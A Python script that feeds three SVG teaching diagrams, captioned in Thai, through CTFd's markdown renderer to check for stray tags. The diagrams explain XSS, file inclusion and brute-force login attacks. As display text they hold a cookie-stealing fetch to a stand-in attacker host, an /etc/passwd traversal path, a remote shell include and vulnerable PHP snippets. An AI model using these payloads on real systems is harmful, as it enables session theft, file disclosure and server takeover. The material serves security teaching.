from CTFd import create_app
from CTFd.utils import markdown

# 2. XSS SVG
xss_svg = """<svg viewBox="0 0 980 340" style="width:100%; height:auto; display:block; margin:0 auto; background:#070b16; border-radius:14px; border:1px solid rgba(168, 85, 247, 0.35); box-shadow:0 14px 45px rgba(0,0,0,0.7), 0 0 25px rgba(168, 85, 247, 0.12);">
<defs>
<style>
@keyframes xssBeam { from { stroke-dashoffset: 24; } to { stroke-dashoffset: 0; } }
@keyframes cookieFly { 0% { transform: translate(0,0); opacity: 0.3; } 50% { opacity: 1; } 100% { transform: translate(-380px, -60px); opacity: 0; } }
.xss-stream { stroke-dasharray: 6, 3; animation: xssBeam 1s linear infinite; }
</style>
</defs>
<path d="M 0,60 L 980,60 M 0,160 L 980,160 M 0,260 L 980,260" stroke="rgba(255,255,255,0.02)" stroke-width="1"/>
<!-- 1. Attacker -->
<g transform="translate(30, 65)">
<rect x="0" y="0" width="160" height="200" rx="12" fill="#0b1224" stroke="#a855f7" stroke-width="1.5"/>
<circle cx="80" cy="40" r="22" fill="#1e293b" stroke="#c084fc" stroke-width="1.2"/>
<text x="80" y="46" fill="#c084fc" font-size="18" text-anchor="middle">🥷</text>
<text x="80" y="80" fill="#ffffff" font-family="sans-serif" font-size="11" font-weight="bold" text-anchor="middle">Attacker</text>
<rect x="12" y="95" width="136" height="52" rx="6" fill="#02040a" stroke="rgba(255,255,255,0.08)"/>
<text x="18" y="112" fill="#c084fc" font-family="monospace" font-size="8">&lt;script&gt;</text>
<text x="18" y="126" fill="#f43f5e" font-family="monospace" font-size="7.5">fetch('http://atk/?c='</text>
<text x="18" y="138" fill="#f43f5e" font-family="monospace" font-size="7.5">+document.cookie)</text>
<rect x="12" y="155" width="136" height="30" rx="6" fill="rgba(168, 85, 247, 0.2)" stroke="#a855f7" stroke-width="1"/>
<text x="80" y="174" fill="#d8b4fe" font-family="sans-serif" font-size="9" font-weight="bold" text-anchor="middle">Steal Listener: :80</text>
</g>
<!-- Flow 1 -->
<g transform="translate(195, 120)">
<path d="M 0,15 L 75,15" fill="none" stroke="#a855f7" stroke-width="2.5" class="xss-stream"/>
<polygon points="78,15 68,10 68,20" fill="#a855f7"/>
<text x="40" y="5" fill="#d8b4fe" font-family="monospace" font-size="8" text-anchor="middle">1. Inject Script</text>
</g>
<!-- 2. Web Server -->
<g transform="translate(280, 55)">
<rect x="0" y="0" width="230" height="220" rx="12" fill="#0c142b" stroke="#38bdf8" stroke-width="1.5"/>
<rect x="15" y="15" width="200" height="30" rx="6" fill="#1e293b"/>
<text x="115" y="34" fill="#38bdf8" font-family="sans-serif" font-size="11" font-weight="bold" text-anchor="middle">Vulnerable Web Server</text>
<rect x="15" y="55" width="200" height="85" rx="6" fill="#02040a" stroke="rgba(255,255,255,0.08)"/>
<text x="25" y="74" fill="#94a3b8" font-family="monospace" font-size="8.5">// Reflected / Stored:</text>
<text x="25" y="90" fill="#cbd5e1" font-family="monospace" font-size="8">&lt;h1&gt;Welcome,&lt;/h1&gt;</text>
<text x="25" y="106" fill="#f43f5e" font-family="monospace" font-size="8">&lt;?php echo $_GET['q'];?&gt;</text>
<text x="25" y="124" fill="#94a3b8" font-family="monospace" font-size="8">// No htmlspecialchars()</text>
<rect x="15" y="150" width="200" height="48" rx="6" fill="rgba(239, 68, 68, 0.15)" stroke="#ef4444" stroke-width="1"/>
<text x="115" y="170" fill="#fca5a5" font-family="sans-serif" font-size="8.5" font-weight="bold" text-anchor="middle">⚠️ Server ไม่กรอง HTML Entities</text>
<text x="115" y="186" fill="#cbd5e1" font-family="sans-serif" font-size="8" text-anchor="middle">ส่งต่อโค้ด JavaScript ให้ผู้เยี่ยมชม</text>
</g>
<!-- Flow 2 -->
<g transform="translate(515, 120)">
<path d="M 0,15 L 75,15" fill="none" stroke="#38bdf8" stroke-width="2.5" class="xss-stream"/>
<polygon points="78,15 68,10 68,20" fill="#38bdf8"/>
<text x="40" y="5" fill="#7dd3fc" font-family="monospace" font-size="8" text-anchor="middle">2. Deliver Page</text>
</g>
<!-- 3. Victim Client Browser -->
<g transform="translate(600, 55)">
<rect x="0" y="0" width="350" height="220" rx="12" fill="#0b1224" stroke="#10b981" stroke-width="1.5"/>
<rect x="15" y="15" width="320" height="30" rx="6" fill="#1e293b"/>
<circle cx="30" cy="30" r="4" fill="#ef4444"/><circle cx="42" cy="30" r="4" fill="#f59e0b"/><circle cx="54" cy="30" r="4" fill="#10b981"/>
<text x="180" y="34" fill="#10b981" font-family="sans-serif" font-size="10.5" font-weight="bold" text-anchor="middle">Victim Client Browser (Chrome / Edge)</text>
<rect x="15" y="55" width="320" height="85" rx="6" fill="#02040a" stroke="rgba(255,255,255,0.08)"/>
<text x="25" y="74" fill="#fbbf24" font-family="monospace" font-size="8.5">[Browser DOM Execution]:</text>
<text x="25" y="92" fill="#cbd5e1" font-family="monospace" font-size="8">&bull; JavaScript รันภายใต้ Security Context ของเหยื่อ</text>
<text x="25" y="108" fill="#4ade80" font-family="monospace" font-size="8">&bull; document.cookie &rarr; PHPSESSID=9a8bf12c...</text>
<text x="25" y="126" fill="#f43f5e" font-family="monospace" font-size="8.5" font-weight="bold">&bull; Exfiltrating Session Token to Attacker!</text>
<rect x="15" y="150" width="320" height="52" rx="6" fill="rgba(244, 63, 94, 0.15)" stroke="#f43f5e" stroke-width="1"/>
<text x="175" y="171" fill="#fca5a5" font-family="sans-serif" font-size="9" font-weight="bold" text-anchor="middle">🚨 ไคลเอนต์ถูกโจมตี (Client-Side Hijack)</text>
<text x="175" y="189" fill="#cbd5e1" font-family="sans-serif" font-size="8" text-anchor="middle">แฮกเกอร์สวมรอยเป็นเหยื่อได้โดยไม่ต้องรู้รหัสผ่าน</text>
</g>
<!-- Bottom Callout -->
<g transform="translate(30, 290)">
<rect x="0" y="0" width="920" height="38" rx="8" fill="rgba(15, 23, 42, 0.95)" stroke="rgba(255,255,255,0.08)"/>
<text x="18" y="23" fill="#c084fc" font-family="sans-serif" font-size="9.5" font-weight="bold">💡 หัวใจสำคัญของ XSS:</text>
<text x="160" y="23" fill="#cbd5e1" font-family="sans-serif" font-size="9">เป้าหมายไม่ใช่เซิร์ฟเวอร์โดยตรง แต่เป็นการ "ฝากสคริปต์อันตราย" ไว้บนเว็บ เพื่อไปรันในเครื่องของผู้ใช้คนอื่นๆ ที่เข้ามาดูหน้าเว็บนั้น!</text>
</g>
</svg>"""

# 3. File Inclusion SVG (LFI & RFI)
lfi_svg = """<svg viewBox="0 0 980 340" style="width:100%; height:auto; display:block; margin:0 auto; background:#070b16; border-radius:14px; border:1px solid rgba(251, 191, 36, 0.35); box-shadow:0 14px 45px rgba(0,0,0,0.7), 0 0 25px rgba(251, 191, 36, 0.12);">
<defs>
<style>
@keyframes lfiFlow { from { stroke-dashoffset: 24; } to { stroke-dashoffset: 0; } }
.lfi-stream { stroke-dasharray: 6, 3; animation: lfiFlow 1s linear infinite; }
</style>
</defs>
<path d="M 0,60 L 980,60 M 0,160 L 980,160 M 0,260 L 980,260" stroke="rgba(255,255,255,0.02)" stroke-width="1"/>
<!-- Left: User Request -->
<g transform="translate(30, 60)">
<rect x="0" y="0" width="220" height="210" rx="12" fill="#0b1224" stroke="#fbbf24" stroke-width="1.5"/>
<rect x="15" y="15" width="190" height="30" rx="6" fill="#1e293b"/>
<text x="110" y="34" fill="#fde047" font-family="sans-serif" font-size="11" font-weight="bold" text-anchor="middle">File Inclusion Request</text>
<rect x="12" y="55" width="196" height="65" rx="6" fill="#02040a" stroke="rgba(255,255,255,0.08)"/>
<text x="18" y="74" fill="#94a3b8" font-family="monospace" font-size="8">1. LFI Payload (Local):</text>
<text x="18" y="92" fill="#fbbf24" font-family="monospace" font-size="8.5">?page=../../../../etc/passwd</text>
<text x="18" y="110" fill="#4ade80" font-family="monospace" font-size="7.5">php://filter/convert.base64...</text>
<rect x="12" y="130" width="196" height="55" rx="6" fill="#02040a" stroke="rgba(255,255,255,0.08)"/>
<text x="18" y="148" fill="#94a3b8" font-family="monospace" font-size="8">2. RFI Payload (Remote):</text>
<text x="18" y="168" fill="#f43f5e" font-family="monospace" font-size="8">?file=http://atk/shell.txt</text>
</g>
<!-- Flow -->
<g transform="translate(255, 145)">
<path d="M 0,15 L 55,15" fill="none" stroke="#fbbf24" stroke-width="2.5" class="lfi-stream"/>
<polygon points="58,15 48,10 48,20" fill="#fbbf24"/>
</g>
<!-- Middle: PHP include() Engine -->
<g transform="translate(320, 50)">
<rect x="0" y="0" width="270" height="230" rx="12" fill="#0c142b" stroke="#38bdf8" stroke-width="1.5"/>
<rect x="15" y="15" width="240" height="30" rx="6" fill="#1e293b"/>
<text x="135" y="34" fill="#38bdf8" font-family="sans-serif" font-size="11" font-weight="bold" text-anchor="middle">PHP File Engine: include()</text>
<rect x="15" y="55" width="240" height="95" rx="6" fill="#02040a" stroke="rgba(255,255,255,0.08)"/>
<text x="25" y="76" fill="#94a3b8" font-family="monospace" font-size="8.5">&lt;?php</text>
<text x="25" y="94" fill="#cbd5e1" font-family="monospace" font-size="8.5">$p = $_GET['page'];</text>
<text x="25" y="112" fill="#fde047" font-family="monospace" font-size="9" font-weight="bold">include($p); // ไร้การตรวจสอบ</text>
<text x="25" y="130" fill="#94a3b8" font-family="monospace" font-size="8.5">?&gt;</text>
<rect x="15" y="160" width="240" height="50" rx="6" fill="rgba(251, 191, 36, 0.15)" stroke="#fbbf24" stroke-width="1"/>
<text x="135" y="180" fill="#fde047" font-family="sans-serif" font-size="8.5" font-weight="bold" text-anchor="middle">⚠️ include() อ่านและรันไฟล์ทันที</text>
<text x="135" y="196" fill="#cbd5e1" font-family="sans-serif" font-size="8" text-anchor="middle">หากเป็นโค้ด PHP จะถูกประมวลผลบนเซิร์ฟเวอร์</text>
</g>
<!-- Flow -->
<g transform="translate(595, 145)">
<path d="M 0,15 L 55,15" fill="none" stroke="#10b981" stroke-width="2.5" class="lfi-stream"/>
<polygon points="58,15 48,10 48,20" fill="#10b981"/>
</g>
<!-- Right: Target Resolution (Local OS File / Remote Shell) -->
<g transform="translate(660, 50)">
<rect x="0" y="0" width="290" height="230" rx="12" fill="#0b1224" stroke="#10b981" stroke-width="1.5"/>
<rect x="15" y="15" width="260" height="30" rx="6" fill="#1e293b"/>
<text x="145" y="34" fill="#4ade80" font-family="sans-serif" font-size="10.5" font-weight="bold" text-anchor="middle">ผลลัพธ์การโจมตี (Impact)</text>
<rect x="15" y="55" width="260" height="75" rx="6" fill="#02040a" stroke="rgba(255,255,255,0.08)"/>
<text x="25" y="74" fill="#fde047" font-family="monospace" font-size="8">📂 LFI Impact: Data Leak</text>
<text x="25" y="90" fill="#cbd5e1" font-family="monospace" font-size="7.5">&bull; อ่านไฟล์ระบบ: /etc/passwd, boot.ini</text>
<text x="25" y="104" fill="#cbd5e1" font-family="monospace" font-size="7.5">&bull; อ่าน Source Code ผ่าน php://filter</text>
<text x="25" y="118" fill="#cbd5e1" font-family="monospace" font-size="7.5">&bull; อ่าน Apache Access Log / SSH Log</text>
<rect x="15" y="140" width="260" height="70" rx="6" fill="rgba(239, 68, 68, 0.15)" stroke="#ef4444" stroke-width="1"/>
<text x="25" y="160" fill="#fca5a5" font-family="monospace" font-size="8" font-weight="bold">🌐 RFI Impact: Remote Code Exec</text>
<text x="25" y="176" fill="#cbd5e1" font-family="monospace" font-size="7.5">&bull; ดึง Webshell จากเซิร์ฟเวอร์ภายนอก</text>
<text x="25" y="190" fill="#fca5a5" font-family="monospace" font-size="7.5">&bull; สั่งรันโค้ดอันตราย ยึดเซิร์ฟเวอร์เบ็ดเสร็จ</text>
</g>
<!-- Bottom Callout -->
<g transform="translate(30, 290)">
<rect x="0" y="0" width="920" height="38" rx="8" fill="rgba(15, 23, 42, 0.95)" stroke="rgba(255,255,255,0.08)"/>
<text x="18" y="23" fill="#fde047" font-family="sans-serif" font-size="9.5" font-weight="bold">💡 LFI vs RFI แตกต่างกันอย่างไร?:</text>
<text x="220" y="23" fill="#cbd5e1" font-family="sans-serif" font-size="9">LFI เจาะอ่านไฟล์ภายในเครื่องเซิร์ฟเวอร์เอง ส่วน RFI ดึงไฟล์โค้ดแปลกปลอมจากเซิร์ฟเวอร์ของแฮกเกอร์ข้ามอินเทอร์เน็ตมารัน!</text>
</g>
</svg>"""

# 4. Brute Force SVG
brute_svg = """<svg viewBox="0 0 980 340" style="width:100%; height:auto; display:block; margin:0 auto; background:#070b16; border-radius:14px; border:1px solid rgba(56, 189, 248, 0.35); box-shadow:0 14px 45px rgba(0,0,0,0.7), 0 0 25px rgba(56, 189, 248, 0.12);">
<defs>
<style>
@keyframes bfFast { from { stroke-dashoffset: 16; } to { stroke-dashoffset: 0; } }
@keyframes lockCrack { 0%, 100% { stroke: #ef4444; } 50% { stroke: #10b981; } }
.bf-stream { stroke-dasharray: 4, 2; animation: bfFast 0.5s linear infinite; }
.crack-anim { animation: lockCrack 2s infinite; }
</style>
</defs>
<path d="M 0,60 L 980,60 M 0,160 L 980,160 M 0,260 L 980,260" stroke="rgba(255,255,255,0.02)" stroke-width="1"/>
<!-- Left: Wordlist & Tools -->
<g transform="translate(30, 60)">
<rect x="0" y="0" width="220" height="210" rx="12" fill="#0b1224" stroke="#38bdf8" stroke-width="1.5"/>
<rect x="15" y="15" width="190" height="30" rx="6" fill="#1e293b"/>
<text x="110" y="34" fill="#38bdf8" font-family="sans-serif" font-size="11" font-weight="bold" text-anchor="middle">Brute-Force Engines</text>
<rect x="15" y="55" width="190" height="70" rx="6" fill="#02040a" stroke="rgba(255,255,255,0.08)"/>
<text x="25" y="74" fill="#94a3b8" font-family="monospace" font-size="8">📖 Dictionary / Wordlist:</text>
<text x="25" y="90" fill="#cbd5e1" font-family="monospace" font-size="7.5">admin:123456 [401 FAIL]</text>
<text x="25" y="102" fill="#cbd5e1" font-family="monospace" font-size="7.5">admin:password [401 FAIL]</text>
<text x="25" y="116" fill="#4ade80" font-family="monospace" font-size="8" font-weight="bold">admin:p@ssW0rd [200 OK!]</text>
<rect x="15" y="135" width="190" height="55" rx="6" fill="rgba(56, 189, 248, 0.15)" stroke="#38bdf8" stroke-width="1"/>
<text x="110" y="154" fill="#7dd3fc" font-family="sans-serif" font-size="8.5" font-weight="bold" text-anchor="middle">🛠️ เครื่องมือหลัก:</text>
<text x="110" y="172" fill="#cbd5e1" font-family="monospace" font-size="8" text-anchor="middle">Hydra &bull; Wfuzz &bull; Python Script</text>
</g>
<!-- Flow -->
<g transform="translate(255, 145)">
<path d="M 0,15 L 55,15" fill="none" stroke="#38bdf8" stroke-width="2.5" class="bf-stream"/>
<polygon points="58,15 48,10 48,20" fill="#38bdf8"/>
<text x="28" y="5" fill="#7dd3fc" font-family="monospace" font-size="7.5" text-anchor="middle">100 req/s</text>
</g>
<!-- Middle: Authentication Gateway -->
<g transform="translate(320, 50)">
<rect x="0" y="0" width="280" height="230" rx="12" fill="#0c142b" stroke="#f43f5e" stroke-width="1.5"/>
<rect x="15" y="15" width="250" height="30" rx="6" fill="#1e293b"/>
<text x="140" y="34" fill="#f87171" font-family="sans-serif" font-size="11" font-weight="bold" text-anchor="middle">Target Login Gateway (/login.php)</text>
<rect x="15" y="55" width="250" height="90" rx="6" fill="#02040a" stroke="rgba(255,255,255,0.08)"/>
<text x="25" y="74" fill="#94a3b8" font-family="monospace" font-size="8">POST /login.php HTTP/1.1</text>
<text x="25" y="90" fill="#cbd5e1" font-family="monospace" font-size="8">Host: target.com</text>
<text x="25" y="106" fill="#cbd5e1" font-family="monospace" font-size="8">username=admin&amp;password=FUZZ</text>
<text x="25" y="128" fill="#f43f5e" font-family="monospace" font-size="8">&larr; สุ่มทดสอบทุกคำในพจนานุกรม</text>
<rect x="15" y="155" width="250" height="55" rx="6" fill="rgba(239, 68, 68, 0.15)" stroke="#ef4444" stroke-width="1"/>
<text x="140" y="175" fill="#fca5a5" font-family="sans-serif" font-size="8.5" font-weight="bold" text-anchor="middle">⚠️ ไม่มี Rate Limiting &amp; Captcha</text>
<text x="140" y="193" fill="#cbd5e1" font-family="sans-serif" font-size="8" text-anchor="middle">เปิดโอกาสให้ทดสอบยิงรหัสผ่านได้ไม่จำกัด</text>
</g>
<!-- Flow -->
<g transform="translate(605, 145)">
<path d="M 0,15 L 55,15" fill="none" stroke="#10b981" stroke-width="2.5" class="bf-stream"/>
<polygon points="58,15 48,10 48,20" fill="#10b981"/>
</g>
<!-- Right: Lock Cracker Vault -->
<g transform="translate(670, 50)">
<rect x="0" y="0" width="280" height="230" rx="12" fill="#0b1224" stroke="#10b981" stroke-width="1.5"/>
<rect x="15" y="15" width="250" height="30" rx="6" fill="#1e293b"/>
<text x="140" y="34" fill="#4ade80" font-family="sans-serif" font-size="10.5" font-weight="bold" text-anchor="middle">Credentials Cracker (Match Found!)</text>
<circle cx="140" cy="100" r="32" fill="#040711" stroke="#10b981" stroke-width="2" class="crack-anim"/>
<text x="140" y="108" font-size="28" text-anchor="middle">🔓</text>
<rect x="15" y="150" width="250" height="60" rx="6" fill="rgba(16, 185, 129, 0.15)" stroke="#10b981" stroke-width="1"/>
<text x="140" y="172" fill="#86efac" font-family="monospace" font-size="9" font-weight="bold" text-anchor="middle">[+] SUCCESS: Valid Credentials Found</text>
<text x="140" y="190" fill="#ffffff" font-family="monospace" font-size="9" text-anchor="middle">admin : p@ssW0rd (HTTP 200 OK)</text>
</g>
<!-- Bottom Callout -->
<g transform="translate(30, 290)">
<rect x="0" y="0" width="920" height="38" rx="8" fill="rgba(15, 23, 42, 0.95)" stroke="rgba(255,255,255,0.08)"/>
<text x="18" y="23" fill="#38bdf8" font-family="sans-serif" font-size="9.5" font-weight="bold">💡 กลยุทธ์ Brute Force ที่พบบ่อย:</text>
<text x="210" y="23" fill="#cbd5e1" font-family="sans-serif" font-size="9">Simple Brute Force, Dictionary Attack, Hybrid Attack, Credential Stuffing, และ Reverse Brute Force</text>
</g>
</svg>"""

for name, s in [("XSS", xss_svg), ("LFI", lfi_svg), ("Brute", brute_svg)]:
    r = markdown(s)
    print(f"{name} SVG: any <p>: {'<p>' in r}, any &lt;div: {'&lt;div' in r}")
